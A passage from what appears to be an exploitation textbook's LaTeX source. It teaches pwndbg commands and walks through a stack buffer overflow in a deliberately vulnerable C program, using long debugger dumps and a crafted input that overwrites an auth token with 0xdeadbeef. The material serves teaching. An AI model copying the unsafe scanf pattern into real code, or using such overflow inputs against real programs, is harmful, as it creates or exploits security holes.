+02:0010│ rbp  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+03:0018│      0x7fffffffdec8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+04:0020│      0x7fffffffded0 ◂— 0x0
+05:0028│      0x7fffffffded8 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2bb ◂— 0x65642f656d6f682f ('/home/de')
+06:0030│      0x7fffffffdee0 ◂— 0x1f7ffcca0
+07:0038│      0x7fffffffdee8 —▸ 0x4005f6 (main) ◂— push   rbp
+pwndbg> 
+\end{lstlisting}
+
+Set a breakpoint at the call to \texttt{scanf()} and pause execution there.
+You'll notice that the arguments are a ``\%d'' format string and a memory
+address, which is currently uninitialized. At this point you have 3 breakpoints:
+one at the start of \texttt{main()}, one at the call to \texttt{puts()} and one
+at the call to \texttt{scanf()}. Vanilla \texttt{gdb} provides \texttt{info
+breakpoints}, but \texttt{pwndbg} has a family of commands for breakpoint
+control. \texttt{bl} lists breakpoints, \texttt{bc} clears them,
+\texttt{be} and \texttt{bd} enables and disables them respectively, and
+\texttt{bp} sets them.
+
+\begin{lstlisting}
+pwndbg> bp *main+50
+Breakpoint 3 at 0x400628
+pwndbg> c
+Continuing.
+ELF example
+
+Breakpoint 3, 0x0000000000400628 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+ RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x4006e0 ◂— and    eax, 0x1000064 /* '%d' */
+*RSI  0x7fffffffdeb4 ◂— 0x363f190000007fff
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+ R12  0x400500 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdfa0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+*RIP  0x400628 (main+50) ◂— call   0x4004e0
+[───────────DISASM───────────]
+   0x400612 <main+28>    call   puts@plt                      <0x4004b0>
+ 
+   0x400617 <main+33>    lea    rax, [rbp - 0xc]
+   0x40061b <main+37>    mov    rsi, rax
+   0x40061e <main+40>    mov    edi, 0x4006e0
+   0x400623 <main+45>    mov    eax, 0
+ ► 0x400628 <main+50>    call   __isoc99_scanf@plt            <0x4004e0>
+        format: 0x4006e0 ◂— 0x3b031b0100006425 /* '%d' */
+        vararg: 0x7fffffffdeb4 ◂— 0x363f190000007fff
+ 
+   0x40062d <main+55>    mov    eax, 0
+   0x400632 <main+60>    mov    rdx, qword ptr [rbp - 8]
+   0x400636 <main+64>    xor    rdx, qword ptr fs:[0x28]
+   0x40063f <main+73>    je     main+80                       <0x400646>
+ 
+   0x400641 <main+75>    call   __stack_chk_fail@plt          <0x4004c0>
+[────────────STACK────────────]
+00:0000│ rsp rsi-4  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+01:0008│            0x7fffffffdeb8 ◂— 0xeec7bf58363f1900
+02:0010│ rbp        0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+03:0018│            0x7fffffffdec8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+04:0020│            0x7fffffffded0 ◂— 0x0
+05:0028│            0x7fffffffded8 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2bb ◂— 0x65642f656d6f682f ('/home/de')
+06:0030│            0x7fffffffdee0 ◂— 0x1f7ffcca0
+07:0038│            0x7fffffffdee8 —▸ 0x4005f6 (main) ◂— push   rbp
+[───────────BACKTRACE───────────]
+ ► f 0           400628 main+50
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+50
+pwndbg> bl
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep y   0x00000000004005f6 <main>
+	breakpoint already hit 1 time
+2       breakpoint     keep y   0x0000000000400612 <main+28>
+	breakpoint already hit 1 time
+3       breakpoint     keep y   0x0000000000400628 <main+50>
+	breakpoint already hit 1 time
+pwndbg> bd 1
+pwndbg> r
+Starting program: /home/devneal/Security/REFE/textbook/example_code/elf 
+
+Breakpoint 2, 0x0000000000400612 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+ RAX  0x0
+ RBX  0x0
+*RCX  0x0
+*RDX  0x7fffffffdfb8 —▸ 0x7fffffffe2f1 ◂— 'XDG_VTNR=7'
+*RDI  0x4006d4 ◂— and    byte ptr [rbp + 0x78], r12b /* 'ELF example' */
+*RSI  0x7fffffffdfa8 —▸ 0x7fffffffe2bb ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x4006c0 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+ R12  0x400500 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdfa0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+*RIP  0x400612 (main+28) ◂— call   0x4004b0
+[───────────DISASM───────────]
+   0x4005fa <main+4>     sub    rsp, 0x10
+   0x4005fe <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x400607 <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40060b <main+21>    xor    eax, eax
+   0x40060d <main+23>    mov    edi, 0x4006d4
+ ► 0x400612 <main+28>    call   puts@plt                      <0x4004b0>
+        s: 0x4006d4 ◂— 'ELF example'
+ 
+   0x400617 <main+33>    lea    rax, [rbp - 0xc]
+   0x40061b <main+37>    mov    rsi, rax
+   0x40061e <main+40>    mov    edi, 0x4006e0
+   0x400623 <main+45>    mov    eax, 0
+   0x400628 <main+50>    call   __isoc99_scanf@plt            <0x4004e0>
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+01:0008│      0x7fffffffdeb8 ◂— 0x5a6d69cf5878bc00
+02:0010│ rbp  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+03:0018│      0x7fffffffdec8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+04:0020│      0x7fffffffded0 ◂— 0x0
+05:0028│      0x7fffffffded8 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2bb ◂— 0x65642f656d6f682f ('/home/de')
+06:0030│      0x7fffffffdee0 ◂— 0x1f7ffcca0
+07:0038│      0x7fffffffdee8 —▸ 0x4005f6 (main) ◂— push   rbp
+[───────────BACKTRACE───────────]
+ ► f 0           400612 main+28
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *0x400612
+pwndbg> bl
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep n   0x00000000004005f6 <main>
+2       breakpoint     keep y   0x0000000000400612 <main+28>
+	breakpoint already hit 1 time
+3       breakpoint     keep y   0x0000000000400628 <main+50>
+pwndbg> 
+\end{lstlisting}
+
+\texttt{pwndbg} is packed with other neat commands that we'll go over as we come
+to the relevant exploits. It's worth spending some time getting comfortable
+working in \texttt{pwndbg}, as it is a very powerful tool for developing
+exploits.
+
+Below is a list of a few useful \texttt{pwndbg} commands. These are more than
+enough to get started using \texttt{pwndbg}.
+
+% TODO: find a place for stripped binaries (info files for entry point, main
+% address from _start args
+% TODO: use a binary with arguments to show argc / argv / telescope
+\begin{itemize}
+    \item context [registers / disassembly / stack / backtrace] - display
+        information on the program state
+    \item emulate / nearpc [address] - view disassembly near address (or near
+        the program counter by default)
+    \item argc - display number of program arguments
+    \item argv - display program arguments
+    \item db - display data as bytes
+    \item dw - display data as words
+    \item dd - display data as double words
+    \item dq - display data as quad words
+    \item ds - display data as strings
+    \item dps - resolve pointers
+    \item hexdump [address] - display hexdump of data at address
+    \item bp - set breakpoint
+    \item bd - disable breakpoint
+    \item be - enable breakpoint
+    \item bc - clear breakpoint
+    \item bl - list breakpoints
+\end{itemize}
+
+% TODO: explain mitigations up front
+% bofs, rops
+\section{Exploiting the Stack}
+
+% TODO: intro?
+
+% overwriting variables and return address
+% TODO: use pwndbg distance
+\subsection{Memory Corruption}
+Recall that the stack is used to handle nested function calls through stack
+frames and to store local variables. Since the stack grows upward toward lower
+memory addresses, variables on the stack are usually stored with the most
+recently declared variables at the top and the least recently used variables at
+the bottom. This can cause problems when too much data is written to a buffer
+at the top of stack. All of the data will still be written, even if it means
+overwriting the variables beneath the buffer. Those variables will then be left
+with corrupt values.
+
+This concept is best understood with an example. Consider the program below,
+which I've compiled with \texttt{gcc -o memory\_corruption
+memory\_corruption.c}.
+
+\begin{lstlisting}
+#include <stdio.h>
+
+void empty(void) {
+    printf("You don't have permission to perform this action.\n");
+}
+
+void win(void) {
+    printf("Access granted.\n");
+}
+
+void lose(void) {
+    printf("Invalid auth token.\n");
+}
+
+typedef struct auth {
+    char buf[64];
+    long int token;
+} auth;
+
+int main(void) {
+    auth a;
+    memset(a.buf, 0, 64);
+    a.token = 0;
+
+    printf("Enter the password:\n");
+    scanf("%s", a.buf);
+
+    if (a.token == 0) {
+        empty();
+    } else if (a.token == 0xdeadbeef) {
+        win();
+    } else {
+        lose();
+    }
+}
+\end{lstlisting}
+
+At first glance, it may seem impossible to call either \texttt{win()} or
+\texttt{lose()}. However, the call to \texttt{scanf()} is actually an unsafe
+write, and has the potential to overflow \texttt{a.buf}.
+
+\begin{lstlisting}
+> ./memory_corruption 
+Enter the password:
+I don't know it
+You don't have permission to perform this action.
+> python -c "print 'A' * 65" | ./memory_corruption 
+Enter the password:
+Invalid auth token.
+>
+\end{lstlisting}
+
+When we give the program 65 `A' characters as input, the auth token is no longer
+zero! Let's analyze this some more in \texttt{pwndbg}.
+
+\begin{lstlisting}
+> gdb -q ./memory_corruption
+Loaded 112 commands. Type pwndbg [filter] for a list.
+Reading symbols from ./memory_corruption...(no debugging symbols found)...done.
+pwndbg> b main
+Breakpoint 1 at 0x40067d
+pwndbg> r < <(python -c "print 'A' * 65")
+Starting program: /home/devneal/Security/REFE/textbook/example_code/memory_corruption < <(python -c "print 'A' * 65")
+
+Breakpoint 1, 0x000000000040067d in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x400679 (main) ◂— push   rbp
+ RBX  0x0
+ RCX  0x0
+*RDX  0x7fffffffdf98 —▸ 0x7fffffffe2e1 ◂— 'XDG_VTNR=7'
+*RDI  0x1
+*RSI  0x7fffffffdf88 —▸ 0x7fffffffe29d ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x400790 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+*R12  0x400550 (_start) ◂— xor    ebp, ebp
+*R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RIP  0x40067d (main+4) ◂— sub    rsp, 0x50
+[───────────DISASM───────────]
+ ► 0x40067d <main+4>     sub    rsp, 0x50
+   0x400681 <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x40068a <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40068e <main+21>    xor    eax, eax
+   0x400690 <main+23>    lea    rax, [rbp - 0x50]
+   0x400694 <main+27>    mov    edx, 0x40
+   0x400699 <main+32>    mov    esi, 0
+   0x40069e <main+37>    mov    rdi, rax
+   0x4006a1 <main+40>    call   memset@plt                    <0x400510>
+ 
+   0x4006a6 <main+45>    mov    qword ptr [rbp - 0x10], 0
+   0x4006ae <main+53>    mov    edi, 0x4007fe
+[────────────STACK────────────]
+00:0000│ rbp rsp  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7fffffffdea8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+02:0010│          0x7fffffffdeb0 ◂— 0x0
+03:0018│          0x7fffffffdeb8 —▸ 0x7fffffffdf88 —▸ 0x7fffffffe29d ◂— 0x65642f656d6f682f ('/home/de')
+04:0020│          0x7fffffffdec0 ◂— 0x1f7ffcca0
+05:0028│          0x7fffffffdec8 —▸ 0x400679 (main) ◂— push   rbp
+06:0030│          0x7fffffffded0 ◂— 0x0
+07:0038│          0x7fffffffded8 ◂— 0x701cb6d5ca9d4ec1
+[───────────BACKTRACE───────────]
+ ► f 0           40067d main+4
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint main
+pwndbg> pdisass main 14
+ ► 0x400679 <main>        push   rbp
+   0x40067a <main+1>      mov    rbp, rsp
+   0x40067d <main+4>      sub    rsp, 0x50
+   0x400681 <main+8>      mov    rax, qword ptr fs:[0x28]
+   0x40068a <main+17>     mov    qword ptr [rbp - 8], rax
+   0x40068e <main+21>     xor    eax, eax
+   0x400690 <main+23>     lea    rax, [rbp - 0x50]
+   0x400694 <main+27>     mov    edx, 0x40
+   0x400699 <main+32>     mov    esi, 0
+   0x40069e <main+37>     mov    rdi, rax
+   0x4006a1 <main+40>     call   memset@plt                    <0x400510>
+ 
+   0x4006a6 <main+45>     mov    qword ptr [rbp - 0x10], 0
+   0x4006ae <main+53>     mov    edi, 0x4007fe
+   0x4006b3 <main+58>     call   puts@plt                      <0x4004f0>
+ 
+   0x4006b8 <main+63>     lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>     mov    rsi, rax
+   0x4006bf <main+70>     mov    edi, 0x400812
+   0x4006c4 <main+75>     mov    eax, 0
+   0x4006c9 <main+80>     call   __isoc99_scanf@plt            <0x400530>
+ 
+   0x4006ce <main+85>     mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>     test   rax, rax
+   0x4006d5 <main+92>     jne    main+101                      <0x4006de>
+ 
+   0x4006d7 <main+94>     call   empty                         <0x400646>
+ 
+   0x4006dc <main+99>     jmp    main+127                      <0x4006f8>
+    ↓
+   0x4006f8 <main+127>    mov    eax, 0
+   0x4006fd <main+132>    mov    rcx, qword ptr [rbp - 8]
+   0x400701 <main+136>    xor    rcx, qword ptr fs:[0x28]
+   0x40070a <main+145>    je     main+152                      <0x400711>
+ 
+   0x40070c <main+147>    call   __stack_chk_fail@plt          <0x400500>
+pwndbg> b *main+80
+Breakpoint 2 at 0x4006c9
+pwndbg> c
+Continuing.
+Enter the password:
+
+Breakpoint 2, 0x00000000004006c9 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x400812 ◂— and    eax, 0x73 /* '%s' */
+*RSI  0x7fffffffde50 ◂— 0x0
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffde50 ◂— 0x0
+*RIP  0x4006c9 (main+80) ◂— call   0x400530
+[───────────DISASM───────────]
+   0x4006b3 <main+58>    call   puts@plt                      <0x4004f0>
+ 
+   0x4006b8 <main+63>    lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>    mov    rsi, rax
+   0x4006bf <main+70>    mov    edi, 0x400812
+   0x4006c4 <main+75>    mov    eax, 0
+ ► 0x4006c9 <main+80>    call   __isoc99_scanf@plt            <0x400530>
+        format: 0x400812 ◂— 0x1b01000000007325 /* '%s' */
+        vararg: 0x7fffffffde50 ◂— 0x0
+ 
+   0x4006ce <main+85>    mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>    test   rax, rax
+   0x4006d5 <main+92>    jne    main+101                      <0x4006de>
+ 
+   0x4006d7 <main+94>    call   empty                         <0x400646>
+ 
+   0x4006dc <main+99>    jmp    main+127                      <0x4006f8>
+[────────────STACK────────────]
+00:0000│ rsi rsp  0x7fffffffde50 ◂— 0x0
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           4006c9 main+80
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+80
+pwndbg> dd 0x7fffffffde50 17
+00007fffffffde50     00000000 00000000 00000000 00000000
+00007fffffffde60     00000000 00000000 00000000 00000000
+00007fffffffde70     00000000 00000000 00000000 00000000
+00007fffffffde80     00000000 00000000 00000000 00000000
+00007fffffffde90     00000000
+pwndbg> ni
+0x00000000004006ce in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x1
+ RBX  0x0
+*RCX  0xa
+*RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
+*RDI  0x7fffffffd930 ◂— 0x1
+*RSI  0x1
+*R8   0x0
+*R9   0x7ffff7fce700 ◂— 0x7ffff7fce700
+*R10  0x400812 ◂— and    eax, 0x73 /* '%s' */
+ R11  0x246
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+*RIP  0x4006ce (main+85) ◂— mov    rax, qword ptr [rbp - 0x10]
+[───────────DISASM───────────]
+   0x4006b8 <main+63>     lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>     mov    rsi, rax
+   0x4006bf <main+70>     mov    edi, 0x400812
+   0x4006c4 <main+75>     mov    eax, 0
+   0x4006c9 <main+80>     call   __isoc99_scanf@plt            <0x400530>
+ 
+ ► 0x4006ce <main+85>     mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>     test   rax, rax
+   0x4006d5 <main+92>     jne    main+101                      <0x4006de>
+    ↓
+   0x4006de <main+101>    mov    rdx, qword ptr [rbp - 0x10]
+   0x4006e2 <main+105>    mov    eax, 0xdeadbeef
+   0x4006e7 <main+110>    cmp    rdx, rax
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           4006ce main+85
+   f 1     7ffff7a2d830 __libc_start_main+240
+pwndbg> dd 0x7fffffffde50 17
+00007fffffffde50     41414141 41414141 41414141 41414141
+00007fffffffde60     41414141 41414141 41414141 41414141
+00007fffffffde70     41414141 41414141 41414141 41414141
+00007fffffffde80     41414141 41414141 41414141 41414141
+00007fffffffde90     00000041
+pwndbg> 
+\end{lstlisting}
+
+% TODO: learn to make references to code
+The \texttt{auth} structure is 68 bytes in size. The first 64 bytes are for
+\texttt{buf}, and the following 4 bytes are for \texttt{token}. \texttt{dd
+\&auth 17} displays the entire structure. Notice how before the call to
+\texttt{scanf()} the auth structure is filled with zeros. After the call, the
+first 65 bytes are filled with \texttt{0x41}, the ASCII value for `A'. In
+reality, \texttt{scanf()} also wrote a null byte after the string of 'A's, but
+we can't see it here since \texttt{token} is already zero. You'll also notice
+that the final \texttt{0x41} byte was written to the \emph{last} byte of
+\texttt{token}. This is due to the little-endian byte order used by x86-64
+processors, where the first byte in memory is interpreted as the last byte in a
+machine word. If you view the memory as bytes rather than words, you'll see the
+bytes written sequentially.
+
+\begin{lstlisting}
+pwndbg> db 0x7fffffffde50 68
+00007fffffffde50     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+00007fffffffde60     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+00007fffffffde70     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+00007fffffffde80     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+00007fffffffde90     41 00 00 00
+pwndbg> 
+\end{lstlisting}
+
+% TODO: add disassemble to gdb intro
+According to the output above, \texttt{a.token} is located at
+\texttt{0x7fffffffde90}, and it currently has the value \texttt{0x41}. If we use
+\texttt{gdb} to write \texttt{0xdeadbeef} to \texttt{0x7fffffffde90}, the
+program will call \texttt{win()} instead for this run only.
+
+% TODO: remove escape on $
+\begin{lstlisting}
+pwndbg> set {int}0x7fffffffde90 = 0xdeadbeef
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x1
+ RBX  0x0
+*RCX  0xa
+*RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
+*RDI  0x7fffffffd930 ◂— 0x1
+*RSI  0x1
+*R8   0x0
+*R9   0x7ffff7fce700 ◂— 0x7ffff7fce700
+*R10  0x400812 ◂— and    eax, 0x73 /* '%s' */
+ R11  0x246
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+*RIP  0x4006ce (main+85) ◂— mov    rax, qword ptr [rbp - 0x10]
+[───────────DISASM───────────]
+   0x4006b8 <main+63>     lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>     mov    rsi, rax
+   0x4006bf <main+70>     mov    edi, 0x400812
+   0x4006c4 <main+75>     mov    eax, 0
+   0x4006c9 <main+80>     call   __isoc99_scanf@plt            <0x400530>
+ 
+ ► 0x4006ce <main+85>     mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>     test   rax, rax
+   0x4006d5 <main+92>     jne    main+101                      <0x4006de>
+    ↓
+   0x4006de <main+101>    mov    rdx, qword ptr [rbp - 0x10]
+   0x4006e2 <main+105>    mov    eax, 0xdeadbeef
+   0x4006e7 <main+110>    cmp    rdx, rax
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           4006ce main+85
+   f 1     7ffff7a2d830 __libc_start_main+240
+pwndbg> c
+Continuing.
+Access granted.
+[Inferior 1 (process 28084) exited normally]
+pwndbg> 
+\end{lstlisting}
+
+% TODO: modify the variable, not the register
+We managed to call \texttt{win()}, but doing it with a debugger is much less
+satisfying than doing it without one. After all, we could have simply written
+the address of \texttt{win()} to \texttt{rip} as soon as the program started.
+The real benefit of modifyng \texttt{a.token} is to verify that \emph{if} we can
+write \texttt{0xdeadbeef} to \texttt{a.token}, then we can call \texttt{win()}.
+Let's try doing that next, keeping the little-endian architecture in mind.
+
+\begin{lstlisting}
+pwndbg> r < <(python -c "print 'A' * 64 + '\xef\xbe\xad\xde'")
+Starting program: /home/devneal/Security/REFE/textbook/example_code/memory_corruption < <(python -c "print 'A' * 64 + '\xef\xbe\xad\xde'")
+
+Breakpoint 1, 0x000000000040067d in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x400679 (main) ◂— push   rbp
+ RBX  0x0
+*RCX  0x0
+*RDX  0x7fffffffdf98 —▸ 0x7fffffffe2e1 ◂— 'XDG_VTNR=7'
+*RDI  0x1
+*RSI  0x7fffffffdf88 —▸ 0x7fffffffe29d ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x400790 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RIP  0x40067d (main+4) ◂— sub    rsp, 0x50
+[───────────DISASM───────────]
+   0x400679 <main>       push   rbp
+   0x40067a <main+1>     mov    rbp, rsp
+ ► 0x40067d <main+4>     sub    rsp, 0x50
+   0x400681 <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x40068a <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40068e <main+21>    xor    eax, eax
+   0x400690 <main+23>    lea    rax, [rbp - 0x50]
+   0x400694 <main+27>    mov    edx, 0x40
+   0x400699 <main+32>    mov    esi, 0
+   0x40069e <main+37>    mov    rdi, rax
+   0x4006a1 <main+40>    call   memset@plt                    <0x400510>
+[────────────STACK────────────]
+00:0000│ rbp rsp  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7fffffffdea8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+02:0010│          0x7fffffffdeb0 ◂— 0x0
+03:0018│          0x7fffffffdeb8 —▸ 0x7fffffffdf88 —▸ 0x7fffffffe29d ◂— 0x65642f656d6f682f ('/home/de')
+04:0020│          0x7fffffffdec0 ◂— 0x1f7ffcca0
+05:0028│          0x7fffffffdec8 —▸ 0x400679 (main) ◂— push   rbp
+06:0030│          0x7fffffffded0 ◂— 0x0
+07:0038│          0x7fffffffded8 ◂— 0xe63b86020bb7205
+[───────────BACKTRACE───────────]
+ ► f 0           40067d main+4
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint main
+pwndbg> c
+Continuing.
+Enter the password:
+
+Breakpoint 2, 0x00000000004006c9 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x400812 ◂— and    eax, 0x73 /* '%s' */
+*RSI  0x7fffffffde50 ◂— 0x0
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffde50 ◂— 0x0
+*RIP  0x4006c9 (main+80) ◂— call   0x400530
+[───────────DISASM───────────]
+   0x4006b3 <main+58>    call   puts@plt                      <0x4004f0>
+ 
+   0x4006b8 <main+63>    lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>    mov    rsi, rax
+   0x4006bf <main+70>    mov    edi, 0x400812
+   0x4006c4 <main+75>    mov    eax, 0
+ ► 0x4006c9 <main+80>    call   __isoc99_scanf@plt            <0x400530>
+        format: 0x400812 ◂— 0x1b01000000007325 /* '%s' */
+        vararg: 0x7fffffffde50 ◂— 0x0
+ 
+   0x4006ce <main+85>    mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>    test   rax, rax
+   0x4006d5 <main+92>    jne    main+101                      <0x4006de>
+ 
+   0x4006d7 <main+94>    call   empty                         <0x400646>
+ 
+   0x4006dc <main+99>    jmp    main+127                      <0x4006f8>
+[────────────STACK────────────]
+00:0000│ rsi rsp  0x7fffffffde50 ◂— 0x0
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           4006c9 main+80
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+80
+pwndbg> dd 0x7fffffffde50 17
+00007fffffffde50     00000000 00000000 00000000 00000000
+00007fffffffde60     00000000 00000000 00000000 00000000
+00007fffffffde70     00000000 00000000 00000000 00000000
+00007fffffffde80     00000000 00000000 00000000 00000000
+00007fffffffde90     00000000
+pwndbg> ni
+0x00000000004006ce in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x1
+ RBX  0x0
+*RCX  0xa
+*RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
+*RDI  0x7fffffffd930 ◂— 0x1
+*RSI  0x1
+*R8   0x0
+*R9   0x7ffff7fce700 ◂— 0x7ffff7fce700
+*R10  0x400812 ◂— and    eax, 0x73 /* '%s' */
+ R11  0x246
+ R12  0x400550 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf80 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdea0 —▸ 0x400720 (__libc_csu_init) ◂— push   r15
+ RSP  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+*RIP  0x4006ce (main+85) ◂— mov    rax, qword ptr [rbp - 0x10]
+[───────────DISASM───────────]
+   0x4006b8 <main+63>     lea    rax, [rbp - 0x50]
+   0x4006bc <main+67>     mov    rsi, rax
